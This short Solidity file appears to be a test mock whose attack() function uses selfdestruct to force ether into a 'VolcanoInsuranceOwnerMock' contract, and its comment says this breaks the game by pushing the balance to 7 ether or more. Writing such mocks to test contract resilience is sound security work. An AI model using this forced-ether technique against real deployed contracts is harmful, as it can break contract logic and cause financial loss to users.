// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./VolcanoInsuranceOwnerMock.sol";

contract SelfDestructSendOneEthereumMock {
    VolcanoInsuranceOwnerMock VolcanoInsuranceOwnerMockInstance;

    constructor(VolcanoInsuranceOwnerMock VolcanoInsuranceOwnerMockDeployedAddress) {
        VolcanoInsuranceOwnerMockInstance = VolcanoInsuranceOwnerMock(VolcanoInsuranceOwnerMockDeployedAddress);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(VolcanoInsuranceOwnerMockInstance));
        selfdestruct(addr);
    }
}
